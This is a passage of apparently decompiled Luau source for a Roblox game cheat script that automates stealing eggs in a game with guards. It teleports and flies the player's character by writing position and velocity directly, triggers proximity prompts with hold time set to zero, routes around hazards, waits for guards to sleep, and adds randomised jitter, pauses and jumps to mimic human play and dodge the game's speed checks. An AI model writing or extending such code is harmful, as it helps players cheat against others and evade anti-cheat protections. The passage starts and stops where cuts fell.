								v27.AssemblyLinearVelocity = assemblyLinearVelocity
								v27.AssemblyAngularVelocity = Vector3.zero
							end)
						end)

						n18 = 0
						n19 = 0
						huge3 = math.huge
						v20 = nil
						n20 = 0
						huge4 = math.huge
						state = 5
					elseif state == 5 then
						flag3 = false

						if not (n18 < huge2) then
							state = 44
						else
							state = 6
						end
					elseif state == 6 then
						if fn13(v19) then
							state = 44
						else
							state = 7
						end
					elseif state == 7 then
						if tbl4.Steal.Carrying then
							state = 43
						else
							state = 8
						end
					elseif state == 8 then
						v21 = tbl4.Root()

						if not v21 then
							state = 44
						else
							state = 9
						end
					elseif state == 9 then
						v22 = fn47(carryUid)

						if v22 then
							state = 16
						else
							state = 10
						end
					elseif state == 10 then
						if not (huge3 >= 0.5) then
							state = 17
						else
							state = 11
						end
					elseif state == 11 then
						v22, v23 = fn48(carryUid)

						if v22 then
							state = 15
						else
							state = 12
						end
					elseif state == 12 then
						huge3 = 0

						if v23 then
							state = 13
						else
							state = 17
						end
					elseif state == 13 then
						n19 += 1

						if not (n19 >= 4) then
							state = 17
						else
							state = 14
						end
					elseif state == 14 then
						str2 = "The egg is gone"
						state = 44
					elseif state == 15 then
						n19 = 0
						huge3 = 0
						state = 17
					elseif state == 16 then
						n19 = 0
						state = 17
					elseif state == 17 then
						if v22 then
							state = 18
						else
							state = 28
						end
					elseif state == 18 then
						now = os.clock()

						if v24 then
							state = 20
						else
							state = 19
						end
					elseif state == 19 then
						v25 = v24
						state = 21
					elseif state == 20 then
						v25 = v20
						state = 21
					elseif state == 21 then
						if v25 then
							state = 23
						else
							state = 22
						end
					elseif state == 22 then
						flag4 = v25
						state = 24
					elseif state == 23 then
						flag4 = now > v20
						state = 24
					elseif state == 24 then
						if flag4 then
							state = 25
						else
							state = 27
						end
					elseif state == 25 then
						n21 = (v22 - v24) / math.max(now - v20, 0.0041666666666666666)

						if n21.Magnitude < 3000 then
							state = 26
						else
							state = 27
						end
					elseif state == 26 then
						vector = vector:Lerp(n21, 0.3)
						state = 27
					elseif state == 27 then
						n17 = v22 + Vector3.new(0, 3, 0)
						v24 = v22
						v20 = now
						state = 28
					elseif state == 28 then
						if n20 >= 0.4 then
							state = 29
						else
							state = 32
						end
					elseif state == 29 then
						if fn49(carryUid) then
							state = 31
						else
							state = 30
						end
					elseif state == 30 then
						str2 = "Egg dropped, taking it back"
						n20 = 0
						state = 32
					elseif state == 31 then
						str2 = "Another player has the egg, following it until it drops"
						n20 = 0
						state = 32
					elseif state == 32 then
						if n17 then
							state = 34
						else
							state = 33
						end
					elseif state == 33 then
						flag5 = n17
						state = 35
					elseif state == 34 then
						flag5 = (n17 - v21.Position).Magnitude <= n16
						state = 35
					elseif state == 35 then
						if flag5 then
							state = 36
						else
							state = 37
						end
					elseif state == 36 then
						flag5 = huge4 >= 0.1
						state = 37
					elseif state == 37 then
						if flag5 then
							state = 38
						else
							state = 42
						end
					elseif state == 38 then
						v26 = fn46(n17 - Vector3.new(0, 3, 0), 6, carryUid)

						if v26 then
							state = 40
						else
							state = 39
						end
					elseif state == 39 then
						huge4 = 0
						state = 42
					elseif state == 40 then
						noPrompt = 0

						pcall(function()
							v26.HoldDuration = 0
						end)

						huge4 = 0

						if typeof(fireproximityprompt) ~= "function" then
							state = 42
						else
							state = 41
						end
					elseif state == 41 then
						pcall(fireproximityprompt, v26)
						state = 42
					elseif state == 42 then
						local result = RunService.Heartbeat:Wait()
						n18 += result
						huge4 += result
						huge3 += result
						n20 += result
						state = 5
					elseif state == 43 then
						flag3 = true
						state = 44
					elseif state == 44 then
						connection:Disconnect()
						fn21()

						if flag3 then
							state = 46
						else
							state = 45
						end
					elseif state == 45 then
						flag3 = tbl4.Steal.Carrying == true
						state = 46
					elseif state == 46 then
						return flag3
					elseif state == 47 then
						return false
					end
				end
			end

			local function fn51(arg, arg2)
				local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
				if not position then
					return false
				end

				if tbl4.InsideBase() and not tbl4.InsideBase(position) then
					local v19 = stealHome()

					if v19 then
						str2 = "Leaving the base through the safe zone"
						if not fn35(v19 + Vector3.new(0, 3, 0), arg2, nil, n5) then
							return false
						end
					end
				end

				str2 = "Flying to the egg"
				if not fn35(position + Vector3.new(0, 3, 0), arg2, nil, n5) then
					return false
				end
				str2 = "Taking the egg"
				local v19 = fn44(arg, arg2, 0.6, nil)

				if not v19 and not fn13(arg2) then
					v19 = fn30(arg, arg2)
				end

				if not v19 and not fn32(arg.Uid, arg2) then
					tbl18[arg.Uid] = os.clock() + n7
					return false
				end
				tbl4.Steal.LastFinishedAt = os.clock()
				return true
			end

			local tbl20 = { Uid = nil, Freed = nil, Token = nil }
			local n17 = 3

			local function fn52()
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				local guardAreas = world and world:FindFirstChild("GuardAreas")
				local v19 = tbl4.Root()
				if not guardAreas or not v19 then
					return nil
				end
				local str3 = tostring(localPlayer.UserId)
				local carryAreaId = tbl4.Steal.CarryAreaId and fn42({ AreaId = tostring(tbl4.Steal.CarryAreaId) }) or nil
				local huge3 = math.huge
				local v20 = nil

				for _, child in ipairs(guardAreas:GetChildren()) do
					local guard = child:FindFirstChild("Guard")

					if guard then
						if tostring(guard:GetAttribute("TargetPlayer")) == str3 or tostring(guard:GetAttribute("WakeTargetPlayer")) == str3 then
							return guard
						end

						local ok, result = pcall(function()
							return guard:GetPivot().Position
						end)

						if ok then
							local magnitude = (result - v19.Position).Magnitude

							if magnitude < huge3 then
								v20 = guard
								huge3 = magnitude
							end
						end
					end
				end

				return carryAreaId or v20
			end

			local function fn53(arg, arg2, arg3)
				local v19 = fn52()
				if not v19 then
					return false
				end
				local v20 = fn43(arg, arg3 + Vector3.new(0, 3, 0))
				local n18 = 0

				while true do
					if not v20.Landed and n18 < n12 and not fn13(arg) then
						local ok, result = pcall(function()
							return v19:GetPivot().Position
						end)

						local v21 = tbl4.Root()

						if not (not ok or not v21) then
							if n15 + 5 < (result - v21.Position).Magnitude then
								local vector = Vector3.new(v21.Position.X - result.X, 0, v21.Position.Z - result.Z)
								local n19 = result + (vector.Magnitude > 0.1 and vector.Unit * n15 or Vector3.zero)

								fn35(Vector3.new(n19.X, result.Y + 3, n19.Z), arg, nil, n5, true, function()
									if v20.Landed then
										return "hit"
									end
									return nil
								end)
							end

							n18 += RunService.Heartbeat:Wait()
							continue
						end
					end

					break
				end

				v20.Stop()
				if not v20.Landed then
					return false
				end
				return fn50(arg, arg2)
			end

			tbl4.SafeCarry.Dangers = {}
			tbl4.SafeCarry.DangerAt = 0

			tbl4.SafeCarry.RefreshDangers = function()
				local safeCarry = tbl4.SafeCarry
				local dangerAt = safeCarry.DangerAt
				if os.clock() - dangerAt < 1 then
					return safeCarry.Dangers
				end
				safeCarry.DangerAt = os.clock()
				local dangers = {}

				local function fn54(arg)
					local ok, result, result2 = pcall(function()
						if arg:IsA("Model") then
							return arg:GetBoundingBox()
						end

						if arg:IsA("BasePart") then
							return arg.CFrame, arg.Size
						end
					end)

					if ok and result and result2 then
						local abs = math.abs
						local z = result2.Z
						local n18 = Vector3.new(math.abs(result2.X), 0, abs(z)) * 0.5
						local v19 = (result - result.Position):VectorToWorldSpace(n18)
						local x = n18.X
						local z2 = n18.Z
						local n19 = math.max(math.abs(v19.X), x, z2)
						local x2 = n18.X
						local z3 = n18.Z
						local n20 = math.max(math.abs(v19.Z), x2, z3)

						table.insert(dangers, {
							MinX = result.Position.X - n19,
							MaxX = result.Position.X + n19,
							MinZ = result.Position.Z - n20,
							MaxZ = result.Position.Z + n20,
							Name = arg.Name,
						})
					end
				end

				local function fn55(arg)
					if arg == "ScrambleLocalVisuals" or arg == "DrScrambleEvent" then
						return false
					end
					local v19 = string.lower(arg)
					return string.find(v19, "portal", 1, true) or string.find(v19, "teleport", 1, true) or string.find(v19, "mech", 1, true) or string.find(v19, "arena", 1, true) or string.find(v19, "scramble", 1, true)
				end

				for _, child in ipairs(workspace:GetChildren()) do
					if (child:IsA("Model") or child:IsA("BasePart") or child:IsA("Folder")) and fn55(child.Name) then
						if child:IsA("Folder") then
							for _, child2 in ipairs(child:GetChildren()) do
								fn54(child2)
							end
						else
							fn54(child)
						end
					end
				end

				local world = workspace:FindFirstChild("World")
				world = world and world:FindFirstChild("Build")

				if world then
					for _, child in ipairs(world:GetChildren()) do
						if fn55(child.Name) then
							for _, child2 in ipairs(child:GetChildren()) do
								fn54(child2)
							end
						end
					end
				end

				safeCarry.Dangers = dangers
				return dangers
			end

			tbl4.SafeCarry.Avoid = function(arg, arg2)
				for _, v19 in ipairs(tbl4.SafeCarry.RefreshDangers()) do
					local n18 = v19.MinX - 12
					local n19 = v19.MaxX + 12
					local n20 = v19.MinZ - 12
					local n21 = v19.MaxZ + 12
					local v20, v21, v22 = ipairs({ { arg.X, arg2.X - arg.X, n18, n19 }, { arg.Z, arg2.Z - arg.Z, n20, n21 } })
					local flag3 = true
					local n22 = 0
					local n23 = 1

					for _, v23 in v20, v21, v22 do
						local v24 = v23[1]
						local v25 = v23[2]
						local v26 = v23[3]
						local v27 = v23[4]

						if math.abs(v25) < 1e-06 then
							if v24 < v26 or v24 > v27 then
								flag3 = false
							end
						else
							local n24 = (v26 - v24) / v25
							local n25 = (v27 - v24) / v25

							if not (n25 < n24) then
								local v28 = n25
								n25 = n24
								n24 = v28
							end

							local n26 = math.max(n22, n25)
							local n27 = math.min(n23, n24)

							if n26 > n27 then
								flag3 = false
								n23 = n27
								n22 = n26
							else
								n23 = n27
								n22 = n26
							end
						end
					end

					if flag3 and not (arg.X >= n18 and arg.X <= n19 and arg.Z >= n20 and arg.Z <= n21) then
						local n24 = n20 - 2
						local n25 = n21 + 2
						local flag4 = math.abs(arg.Z - n24) <= math.abs(arg.Z - n25) and n24 or n25

						if flag4 < -440 or flag4 > -290 then
							flag4 = flag4 == n24 and n25 or n24
						end

						local flag5 = math.abs(arg.X - n18) <= math.abs(arg.X - n19) and n18 or n19

						if math.abs(arg.Z - flag4) < 3 then
							flag5 = math.abs(arg2.X - n18) <= math.abs(arg2.X - n19) and n18 or n19
						end

						return Vector3.new(flag5, arg2.Y, flag4), v19.Name
					end
				end

				return arg2, nil
			end

			tbl4.SafeCarry.NewHuman = function(arg)
				local safeCarry = tbl4.SafeCarry
				local laneOffset = safeCarry.LaneOffset
				local tbl21

				tbl21 = {
					Clock = 0,
					Factor = 1,
					Target = 1,
					NextShift = 0,
					Phase = math.random() * 3.1415926535897931 * 2,
					Period = 2 + math.random() * 2.5,
					PauseUntil = 0,
					Lane = (math.random() * 2 - 1) * laneOffset,
					Step = function(arg2, arg3, arg4)
						tbl21.Clock = tbl21.Clock + arg2

						if tbl21.NextShift <= tbl21.Clock then
							tbl21.NextShift = tbl21.Clock + 0.5 + math.random()
							local n18 = math.max(safeCarry.SpeedJitter, 0)

							if arg then
								tbl21.Target = 1 - math.random() * n18
							else
								tbl21.Target = 1 + (math.random() * 2 - 1) * n18
							end
						end

						tbl21.Factor = tbl21.Factor + (tbl21.Target - tbl21.Factor) * math.min(arg2 * 3, 1)
						local wobble = safeCarry.Wobble
						local n18 = math.sin(tbl21.Clock * 2 * 3.1415926535897931 / tbl21.Period + tbl21.Phase) * wobble
						local flag3 = arg4 and arg3 and safeCarry.JumpsPerMinute > 0

						if flag3 then
							local n19 = safeCarry.JumpsPerMinute / 60 * arg2
							flag3 = math.random() < n19
						end

						if flag3 then
							pcall(function()
								arg3.Jump = true
							end)
						end

						local flag4 = false

						if not arg then
							if tbl21.Clock < tbl21.PauseUntil then
								flag4 = true
							else
								local flag5 = safeCarry.PausesPerMinute > 0

								if flag5 then
									local n19 = safeCarry.PausesPerMinute / 60 * arg2
									flag5 = math.random() < n19
								end

								if flag5 then
									tbl21.PauseUntil = tbl21.Clock + 0.3 + math.random() * 0.9
									flag4 = true
								end
							end
						end

						return tbl21.Factor, tbl21.Lane + n18, flag4
					end,
				}

				return tbl21
			end

			tbl4.SafeCarry.React = function(arg, arg2)
				local n18 = math.max(0, math.min(arg, arg2))
				local n19 = math.max(arg, arg2, 0)
				return n18 + math.random() * (n19 - n18)
			end

			tbl4.SafeCarry.RunTo = function(arg, arg2)
				local safeCarry = tbl4.SafeCarry
				local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
				if not position then
					return false
				end
				fn22()
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					humanoid.PlatformStand = false

					if character:FindFirstChildWhichIsA("Tool") then
						pcall(function()
							humanoid:UnequipTools()
						end)
					end
				end

				local v19 = safeCarry.NewHuman(false)
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				local separationLine = world and world:FindFirstChild("SeparationLine")
				local x = separationLine and separationLine:IsA("BasePart") and separationLine.Position.X or 552
				local v20 = stealHome()
				local position2 = tbl4.Root()
				local str3 = "field"
				local z = position2 and position2.Position.Z or position.Z

				if position2 and v20 and position2.Position.X < x - 2 then
					z = v20.Z

					if (Vector3.new(position2.Position.X, 0, position2.Position.Z) - Vector3.new(v20.X, 0, v20.Z)).Magnitude > 20 then
						str3 = "safe"
					end
				end

				local n18 = math.clamp(z + v19.Lane, -425, -300)
				local n19 = position.Y + 3

				local function fn54()
					local v21 = tbl4.Root()
					local character2 = localPlayer.Character
					if safeCarry.RunHeight <= 0.5 or not v21 or not character2 then
						return
					end
					local runHeight = safeCarry.RunHeight
					local n20 = math.max(v21.Position.Y, n19) + runHeight

					if v21.Position.Y < n20 - 2 then
						pcall(function()
							local rotation = v21.CFrame.Rotation
							character2:PivotTo(CFrame.new(Vector3.new(v21.Position.X, n20, v21.Position.Z)) * rotation)
							v21.AssemblyLinearVelocity = Vector3.zero
						end)
					end
				end

				if str3 == "field" then
					fn54()
				end

				local now = os.clock()
				local now2 = os.clock()
				local now3 = os.clock()
				position2 = position2 and position2.Position or nil

				local function fn55(arg3, arg4, arg5, arg6)
					local vector = Vector3.new(arg4.X - arg3.Position.X, 0, arg4.Z - arg3.Position.Z)
					local magnitude = vector.Magnitude
					local unit = magnitude > 0.01 and vector.Unit or Vector3.zero

					if safeCarry.RunHeight > 0.5 and str3 == "field" and not arg6 then
						local runSpeed = safeCarry.RunSpeed
						local n20 = math.max(tbl4.WalkSpeed() * runSpeed * arg5, 8)
						local n21 = math.clamp(safeCarry.ClimbShare, 0.1, 0.9)
						local n22 = safeCarry.RunHeight * math.sqrt(1 - n21 * n21) / n21
						local n23 = math.clamp((n19 + safeCarry.RunHeight * math.clamp(Vector3.new(position.X - arg3.Position.X, 0, position.Z - arg3.Position.Z).Magnitude / math.max(n22, 1), 0, 1) - arg3.Position.Y) / 0.12, -n20 * n21, n20 * n21)
						local n24 = unit * math.min(math.sqrt(math.max(n20 * n20 - n23 * n23, 0)), magnitude / 0.05)

						pcall(function()
							arg3.AssemblyLinearVelocity = Vector3.new(n24.X, n23, n24.Z)
						end)

						return
					end

					pcall(function()
						if arg6 or magnitude <= 0.01 then
							if humanoid then
								if safeCarry.RunStyle == "Walk" then
									humanoid:MoveTo(arg3.Position)
								end

								humanoid:Move(Vector3.zero, false)
							end

							if safeCarry.RunStyle ~= "Walk" then
								arg3.AssemblyLinearVelocity = Vector3.new(0, arg3.AssemblyLinearVelocity.Y, 0)
							end
						elseif safeCarry.RunStyle == "Walk" then
							if humanoid then
								humanoid:MoveTo(arg3.Position + unit * math.min(magnitude, 30))
							end
						else
							local runSpeed = safeCarry.RunSpeed
							local n20 = unit * math.min(math.max(tbl4.WalkSpeed() * runSpeed * arg5, 8), magnitude / 0.05)
							arg3.AssemblyLinearVelocity = Vector3.new(n20.X, arg3.AssemblyLinearVelocity.Y, n20.Z)

							if safeCarry.RunAnimate and humanoid then
								humanoid:Move(unit, false)
							end
						end
					end)
				end

				while os.clock() - now < 240 do
					if fn13(arg2) then
						return false
					end
					local v21 = tbl4.Root()
					if not v21 then
						return false
					end
					local now4 = os.clock()
					local n20 = math.max(now4 - now2, 0.0041666666666666666)
					local vector = Vector3.new(position.X - v21.Position.X, 0, position.Z - v21.Position.Z)
					if str3 == "field" and vector.Magnitude <= 2.5 and (safeCarry.RunHeight <= 0.5 or v21.Position.Y - n19 < 4) then
						break
					end
					local v22, v23, flag3 = v19.Step(n20, humanoid, humanoid and humanoid.FloorMaterial ~= Enum.Material.Air)

					if vector.Magnitude <= 15 then
						flag3 = false
					end

					local vector2 = position

					if str3 == "safe" and v20 then
						if (Vector3.new(v20.X, 0, v20.Z) - Vector3.new(v21.Position.X, 0, v21.Position.Z)).Magnitude <= 6 then
							str3 = "field"
							fn54()
						end

						str2 = "Walking out to the safe zone"
						vector2 = v20
					else
						if not safeCarry.StraightRun and safeCarry.RunHeight <= 0.5 and math.abs(position.X - v21.Position.X) > 25 then
							vector2 = Vector3.new(position.X, position.Y, math.clamp(n18 + v23, -425, -300))
						end

						str2 = string.format("Running to the egg, %d studs left", math.floor(vector.Magnitude + 0.5))
					end

					local v24, v25 = safeCarry.Avoid(v21.Position, vector2)

					if v25 then
						str2 = "Walking around " .. tostring(v25)
					end

					fn55(v21, v24, v22, flag3)

					if now4 - now3 >= 1.5 then
						if not flag3 and position2 and (v21.Position - position2).Magnitude < 3 and humanoid then
							pcall(function()
								humanoid.Jump = true
							end)
						end

						position2 = v21.Position
						now3 = now4
					end

					RunService.Heartbeat:Wait()
					now2 = now4
				end

				local v21 = tbl4.Root()

				if v21 then
					fn55(v21, v21.Position, 1, true)
				end

				local vector = nil

				if v21 then
					local vector2 = Vector3.new(v21.Position.X - position.X, 0, v21.Position.Z - position.Z)
					local vector3 = vector2.Magnitude > 0.1 and vector2.Unit * 2 or Vector3.zero
					vector = Vector3.new(position.X + vector3.X, v21.Position.Y, position.Z + vector3.Z)
				end

				local connection = RunService.Heartbeat:Connect(function()
					local v22 = tbl4.Root()
					if not v22 or not vector or tbl4.Steal.Carrying or tbl4.AntiGuard.Busy then
						return
					end
					local vector2 = Vector3.new(vector.X - v22.Position.X, 0, vector.Z - v22.Position.Z)

					pcall(function()
						if vector2.Magnitude > 1.5 then
							local rotation = v22.CFrame.Rotation
							v22.CFrame = CFrame.new(vector.X, v22.Position.Y, vector.Z) * rotation
						end

						v22.AssemblyLinearVelocity = Vector3.new(0, math.min(v22.AssemblyLinearVelocity.Y, 0), 0)
					end)
				end)

				local function fn56(arg3)
					connection:Disconnect()
					return arg3
				end

				local v22 = fn42(arg)
				local now4 = os.clock()
				local v23 = safeCarry.React(safeCarry.ReactMin, safeCarry.ReactMax)

				while true do
					if fn13(arg2) then
						return (fn56(false))
					else
						local n20 = os.clock() - now4
						local n21 = safeCarry.RunWait + v23
						local flag3 = not safeCarry.WaitGuard or not v22 or v22:GetAttribute("GuardState") == "Sleeping"
						if n20 >= n21 and (flag3 or n20 >= n21 + 15) then
							break
						end
						str2 = n20 < n21 and string.format("Waiting before the grab, %.1fs", n21 - n20) or "Waiting for the guard to sleep"
						RunService.Heartbeat:Wait()
					end
				end

				str2 = "Taking the egg"
				local v24 = fn44(arg, arg2, 0.8, nil)

				if not v24 and not fn13(arg2) then
					v24 = fn30(arg, arg2)
				end

				fn56()
				if not v24 then
					return false
				end
				tbl4.Steal.LastFinishedAt = os.clock()
				return true
			end

			tbl4.SafeCarry.Plan = function(arg, arg2, arg3)
				local safeCarry = tbl4.SafeCarry
				local character = localPlayer.Character

				if character then
					character:FindFirstChildOfClass("Humanoid")
				end

				local v19 = tbl4.WalkSpeed()
				arg3 = arg3 or safeCarry.Mult or 1

				if safeCarry.SameSpeedBigEggs then
					arg3 = math.max(arg3, safeCarry.LightMult)
				end

				local n18 = v19 * safeCarry.CarryRatio * arg3
				local n19 = n18 * safeCarry.SpeedRatio
				local n20 = safeCarry.ExcessSeconds * n18
				local n21

				if arg2 and arg2 > n20 then
					n21 = math.min(n19, n18 * arg2 / (arg2 - n20))
				else
					n21 = n19
				end

				local guards = tbl.Guards
				local flag3 = type(guards) == "table" and type(guards.Directory) == "table" and guards.Directory[tostring(arg)] or nil
				local n22 = type(flag3) == "table" and tonumber(flag3.WalkSpeed) or 0
				if not safeCarry.BeatGuard then
					return math.max(math.min(n18 * safeCarry.EasyRatio, n21), n18), true, n18, n21, n22
				end
				local n23 = math.max(n22 + safeCarry.GuardMargin, n18 * safeCarry.MinRatio)
				local n24 = math.max(n23, n22 * safeCarry.GuardRatio)

				if n21 < n23 then
					local n25 = n18 * safeCarry.SpeedRatio
					local n26 = safeCarry.StretchSeconds * n18
					local n27

					if arg2 and arg2 > n26 then
						n27 = math.min(n25, n18 * arg2 / (arg2 - n26))
					else
						n27 = n25
					end

					local n28 = n22 + math.max(safeCarry.GuardMargin, 1)
					if n28 <= n27 then
						return n28, true, n18, n27, n22
					end
				end

				return math.max(math.min(n24, n21), n18), n23 <= n21, n18, n21, n22
			end

			tbl4.SafeCarry.Unsafe = function(arg)
				local safeCarry = tbl4.SafeCarry
				if not safeCarry.Enabled or type(arg) ~= "table" or not arg.Uid or not safeCarry.Blocked[arg.Uid] then
					return nil
				end
				return string.format("the guard caught you with this %s before, skipping it", tostring(arg.Category))
			end

			tbl4.SafeCarry.Settle = function(arg, arg2)
				local safeCarry = tbl4.SafeCarry
				local character = localPlayer.Character

				if character then
					character:FindFirstChildOfClass("Humanoid")
				end

				local n18 = math.max(tbl4.WalkSpeed() * safeCarry.CarryRatio * (safeCarry.Seen[tostring(arg2.Category)] or safeCarry.GuessMult) * safeCarry.WaitRate, 1)
				local n19 = safeCarry.BaseWait + math.max(0, (safeCarry.JumpDistance or 0) - safeCarry.FreeJump) / n18
				local v19 = fn42(arg2)

				while true do
					if fn13(arg) then
						return false
					else
						local n20 = os.clock() - (safeCarry.JumpAt or 0)
						local flag3 = not safeCarry.WaitGuard or not v19 or v19:GetAttribute("GuardState") == "Sleeping"
						if n20 >= n19 and (flag3 or n20 >= n19 + 15) then
							break
						end

						if n20 < n19 then
							str2 = string.format("Letting the jump settle, %.1fs", n19 - n20)
						else
							str2 = "Waiting for the guard to sleep"
						end

						RunService.Heartbeat:Wait()
					end
				end

				return true
			end

			tbl4.SafeCarry.Home = function(arg)
				local safeCarry = tbl4.SafeCarry
				local v19 = stealHome()
				local v20 = tbl4.Root()
				if not v19 or not v20 then
					return false
				end
				fn22()
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				world = world and world:FindFirstChild("SeparationLine")
				local n18 = (world and world:IsA("BasePart") and world.Position.X or 552) - 7
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					humanoid.PlatformStand = false
				end

				local now = os.clock()
				local n19 = 0

				local function fn54()
					local v21 = tbl4.Root()
					if not v21 then
						return
					end
					local v22, v23, v24, v25, v26 = safeCarry.Plan(tbl4.Steal.CarryAreaId, (Vector3.new(v21.Position.X, 0, v21.Position.Z) - Vector3.new(v19.X, 0, v19.Z)).Magnitude + math.max(0, safeCarry.Height) * 2, safeCarry.Mult)
					local n20 = v22 * safeCarry.CarryScale
					n19 = n20
					safeCarry.PlanOk = v23
					safeCarry.FloorSpeed = safeCarry.BeatGuard and math.min(v26 + math.max(safeCarry.GuardMargin, 1), v25) or 0
					str2 = string.format("Carrying home at %d (carry %d, guard %d, max %d)%s", math.floor(n20 + 0.5), math.floor(v24 + 0.5), math.floor(v26 + 0.5), math.floor(v25 + 0.5), v23 and "" or ", guard is faster, going at your max safe speed")
				end

				local function fn55()
					local n20 = math.max(0, safeCarry.Height)
					local v21 = tbl4.Root()
					local character2 = localPlayer.Character
					if n20 <= 0.5 or not v21 or not character2 then
						return
					end
					local n21 = v19.Y + n20
					if n21 - 2 <= v21.Position.Y then
						return
					end
					local rotation = v21.CFrame.Rotation
					local n22 = CFrame.new(Vector3.new(v21.Position.X, n21, v21.Position.Z)) * rotation

					pcall(function()
						character2:PivotTo(n22)
						v21.AssemblyLinearVelocity = Vector3.zero
						v21.AssemblyAngularVelocity = Vector3.zero
					end)
				end

				fn54()
				local v21 = safeCarry.NewHuman(true)
				local v22 = tbl4.Root()
				local n20 = math.clamp((v22 and v22.Position.Z or v19.Z) + v21.Lane, -425, -300)
				local now2 = os.clock()

				if safeCarry.CarryReact > 0 then
					local n21 = os.clock() + safeCarry.React(0, safeCarry.CarryReact)

					while os.clock() < n21 and not fn13(arg) do
						RunService.Heartbeat:Wait()
					end
				end

				local n21 = 0

				if safeCarry.CarryStyle ~= "Walk" then
					fn55()
				end

				while not fn13(arg) do
					local v23 = tbl4.Root()
					if not v23 then
						return false
					end

					if not tbl4.Steal.Carrying then
						if now <= safeCarry.LastDelivered then
							return true
						end
						task.wait(0.1)
						if now <= safeCarry.LastDelivered then
							return true
						end

						if now <= safeCarry.LastFailed then
							str2 = "Delivery was rewound, too fast for your speed"
							return false
						end

						if not safeCarry.PlanOk and tbl4.Steal.CarryUid then
							safeCarry.Blocked[tbl4.Steal.CarryUid] = true
							str2 = string.format("The guard caught you with %s, it is faster than your max safe speed, skipping this egg", tostring(safeCarry.Category))
							return false
						end

						n21 += 1
						if safeCarry.RecoverTries < n21 then
							str2 = "The egg is gone"
							return false
						end
						str2 = "Egg dropped, taking it back"
						if not fn50(arg) then
							str2 = "Could not take the egg back"
							return false
						end
						local n22 = 0

						while fn31() and n22 < 4 and not fn13(arg) do
							n22 += RunService.Heartbeat:Wait()
						end

						local n23 = math.min(now, os.clock())
						fn54()

						if safeCarry.CarryStyle ~= "Walk" then
							fn55()
						end

						v23 = tbl4.Root()
						if not v23 then
							return false
						end
						now = n23
					end

					local now3 = os.clock()
					local n22 = math.max(now3 - now2, 0.0041666666666666666)
					local flag3 = safeCarry.CarryStyle == "Walk"
					local n23 = flag3 and 0 or math.max(0, safeCarry.Height)
					local v24, v25 = v21.Step(n22, n23 <= 0.5 and humanoid or nil, humanoid and humanoid.FloorMaterial ~= Enum.Material.Air)
					local n24 = math.clamp(n20 + v25, -425, -300)
					local vector = v23.Position.X > n18 + 2 and Vector3.new(n18, v23.Position.Y, n24) or v19
					local v26, v27 = safeCarry.Avoid(v23.Position, vector)

					if v27 then
						vector = v26
					end

					local vector2 = Vector3.new(vector.X - v23.Position.X, 0, vector.Z - v23.Position.Z)
					if vector2.Magnitude < 2 and vector == v19 then
						break
					end
					local n25 = math.max(n19 * v24, safeCarry.FloorSpeed or 0)

					if os.clock() < (safeCarry.SlowUntil or 0) then
						n25 *= safeCarry.SlowFactor
					end

					if flag3 then
						pcall(function()
							if humanoid and vector2.Magnitude > 0.01 then
								humanoid:MoveTo(v23.Position + vector2.Unit * math.min(vector2.Magnitude, 30))
							end
						end)
					elseif n23 > 0.5 then
						local n26 = math.clamp(safeCarry.ClimbShare, 0.1, 0.9)
						local y = v19.Y
						local n27 = math.max(0, v23.Position.X - n18)
						local n28 = n23 * math.sqrt(1 - n26 * n26) / n26
						local n29 = y + n23

						if vector == v19 or n27 <= n28 then
							n29 = y + n23 * math.clamp((vector == v19 and 0 or n27) / math.max(n28, 1), 0, 1)
						end

						local n30 = math.clamp((n29 - v23.Position.Y) / 0.12, -n25 * n26, n25 * n26)
						local v28 = math.sqrt(math.max(n25 * n25 - n30 * n30, 0))
						local vector3 = vector2.Magnitude > 0.01 and vector2.Unit * math.min(v28, vector2.Magnitude / 0.05) or Vector3.zero

						pcall(function()
							v23.AssemblyLinearVelocity = Vector3.new(vector3.X, n30, vector3.Z)
						end)
					else
						local vector3 = vector2.Magnitude > 0.01 and vector2.Unit * math.min(n25, vector2.Magnitude / 0.05) or Vector3.zero

						pcall(function()
							v23.AssemblyLinearVelocity = Vector3.new(vector3.X, v23.AssemblyLinearVelocity.Y, vector3.Z)

							if safeCarry.RunAnimate and humanoid and vector2.Magnitude > 0.01 then
								humanoid:Move(vector2.Unit, false)
							end
						end)
					end

					RunService.Heartbeat:Wait()
					now2 = now3
				end

				if humanoid then
					pcall(function()
						local v23 = tbl4.Root()

						if safeCarry.CarryStyle == "Walk" and v23 then
							humanoid:MoveTo(v23.Position)
						end

						humanoid:Move(Vector3.zero, false)
					end)
				end

				local n22 = 0

				while n22 < 2 and not fn13(arg) do
					if safeCarry.LastDelivered >= now then
						return true
					end

					if now <= safeCarry.LastFailed then
						str2 = "Delivery was rewound, too fast for your speed"
						return false
					end

					if not tbl4.Steal.Carrying then
						break
					end
					n22 += RunService.Heartbeat:Wait()
				end

				if tbl4.Steal.Carrying then
					task.wait(0.2)
					local eggState = tbl.EggState

					if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
						pcall(eggState.DropFieldEgg, "PlayerRequest")
					end
				end

				return safeCarry.LastDelivered >= now
			end

			local function fn54(arg)
				local antiGuard = tbl4.AntiGuard

				if antiGuard.Enabled then
					local n18 = 0

					while not antiGuard.Busy and n18 < 1 and not fn13(arg) do
						str2 = "Waiting for Anti Guard to start"
						n18 += RunService.Heartbeat:Wait()
					end

					local busy = antiGuard.Busy
					local n19 = 0

					while antiGuard.Busy and n19 < 30 and not fn13(arg) do
						str2 = "Anti Guard is slipping past the guard"
						n19 += RunService.Heartbeat:Wait()
					end

					if busy then
						local safeCarry = tbl4.SafeCarry
						local v19 = stealHome()
						local n20 = v19 and safeCarry.Enabled and safeCarry.CarryStyle ~= "Walk" and safeCarry.Height > 0.5 and v19.Y + safeCarry.Height or nil
						local n21 = 0

						while n21 < 0.8 and not fn13(arg) do
							str2 = n21 < 0.6 and "Anti Guard done, rising up" or "Anti Guard done, getting ready"
							local v20 = tbl4.Root()

							if v20 and n20 then
								local n22 = n20 - v20.Position.Y
